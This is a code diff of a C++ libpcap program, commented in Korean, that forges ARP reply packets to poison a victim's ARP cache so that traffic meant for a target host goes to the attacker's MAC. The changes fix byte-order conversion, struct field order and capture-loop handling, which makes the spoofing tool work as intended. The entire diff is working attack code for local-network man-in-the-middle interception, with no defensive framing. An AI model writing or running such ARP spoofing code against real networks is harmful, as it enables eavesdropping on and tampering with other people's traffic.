@@ -89,7 +89,7 @@ EthArpPacket* arp_reply(pcap_t* pcap, Ip sip, Ip tip, uint16_t op) {
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
-			break;
+			return nullptr;
 		}
 		EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;
 		if (eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue; // ARP check
@@ -113,23 +113,19 @@ EthArpPacket construct_arp_reply(pcap_t* pcap, Mac my_mac, Mac victim_mac, Ip ta
 	packet.arp_.pln_ = Ip::Size;
 	packet.arp_.op_ = htons(ArpHdr::Reply);
 	packet.arp_.smac_ = my_mac;
-	packet.arp_.sip_ = ntohl(target_ip);
+	packet.arp_.sip_ = htonl(target_ip);
 	packet.arp_.tmac_ = victim_mac;
-	packet.arp_.tip_ = ntohl(victim_ip);
+	packet.arp_.tip_ = htonl(victim_ip);
 
 	return packet;
 }
 
-struct ArpPair{
-	Ip victim_ip;
-	Ip target_ip;
-	Mac victim_mac;
-	Mac target_mac;
-	EthArpPacket spoof_packet;
-
-	// Constructor
-    ArpPair(Ip vip, Mac vmac, Ip tip, Mac tmac, const EthArpPacket& pkt)
-        : victim_ip(vip), target_ip(tip), victim_mac(vmac), target_mac(tmac), spoof_packet(pkt) {}
+struct ArpPair {
+    Ip victim_ip;
+    Ip target_ip;
+    Mac victim_mac;
+    Mac target_mac;
+    EthArpPacket spoof_packet;
 };
 
 std::vector<ArpPair> arp_pairs; 
@@ -181,8 +177,7 @@ int main(int argc, char* argv[]) {
 		EthArpPacket spoof_pkt = construct_arp_reply(pcap, my_mac, victim_mac, target_ip, victim_ip);
 		
 		//3. ARP reply 패킷 구성
-    	arp_pairs.push_back({victim_ip, victim_mac, target_ip, target_mac, spoof_pkt});
-	
+    	arp_pairs.push_back({victim_ip, target_ip, victim_mac, target_mac, spoof_pkt});
 	}
 
 	//4. 패킷 잡으면서 검사 -> victim이 sip이면서 tip의 mac을 묻고 있다면? 패킷 전송
@@ -192,16 +187,16 @@ int main(int argc, char* argv[]) {
 		int res = pcap_next_ex(pcap, &header, &packet);
 		if (res == 0) continue;
 		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+			break;
 		}
+		EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;
 
-		EthArpPacket* recv = (EthArpPacket*)packet;
+		if (eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
+		if (eth_arp_packet->arp_.op_ != htons(ArpHdr::Request)) continue;
 
-		if (recv->eth_.type_ != EthHdr::Arp) continue;
-		if (recv->arp_.op_ != ArpHdr::Request) continue;
-
-		Ip sip = ntohl(recv->arp_.sip_);
-		Ip tip = ntohl(recv->arp_.tip_);
+		Ip sip = ntohl(eth_arp_packet->arp_.sip_);
+		Ip tip = ntohl(eth_arp_packet->arp_.tip_);
 
 		for (const auto& arp_pair : arp_pairs) {
 			if (sip == arp_pair.victim_ip && tip == arp_pair.target_ip){
